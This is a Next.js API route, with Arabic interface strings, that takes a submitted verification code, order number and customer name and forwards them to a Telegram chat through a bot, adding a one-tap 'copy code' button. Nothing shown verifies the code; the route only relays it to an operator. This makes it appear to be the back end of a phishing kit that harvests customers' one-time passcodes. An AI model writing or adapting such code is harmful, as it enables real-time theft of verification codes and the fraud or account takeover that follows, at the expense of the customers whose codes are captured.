import { NextRequest, NextResponse } from "next/server";

// In-memory rate limiting: orderId → { count, firstAt, lastAt }
const attempts = new Map<string, { count: number; firstAt: number; lastAt: number }>();

const MAX_ATTEMPTS = 5;
const WINDOW_MS = 10 * 60 * 1000; // 10 minutes

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  if (!code || !orderId) {
    return NextResponse.json({ ok: false, error: "بيانات ناقصة" }, { status: 400 });
  }

  const now = Date.now();
  const key = String(orderId).slice(0, 64);
  const entry = attempts.get(key);

  if (entry) {
    if (now - entry.firstAt > WINDOW_MS) {
      attempts.delete(key);
    } else {
      if (entry.count >= MAX_ATTEMPTS) {
        return NextResponse.json(
          { ok: false, error: "تجاوزت الحد المسموح من المحاولات" },
          { status: 429 }
        );
      }
      entry.count += 1;
      entry.lastAt = now;
    }
  }

  if (!attempts.has(key)) {
    attempts.set(key, { count: 1, firstAt: now, lastAt: now });
  }

  const text = [
    `🔐 كود تحقق جديد`,
    `🆔 رقم الطلب: ${orderId}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const reply_markup = {
    inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: String(code) } }]],
  };

  let sent = false;
  for (let attempt = 0; attempt < 3; attempt++) {
    try {
      const res = await fetch(
        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text,
            reply_markup,
          }),
          signal: AbortSignal.timeout(8000),
        }
      );
      if (res.ok) { sent = true; break; }
    } catch {}
    if (attempt < 2) await new Promise((r) => setTimeout(r, 1000 * (attempt + 1)));
  }

  return NextResponse.json({ ok: sent }, { status: sent ? 200 : 502 });
}
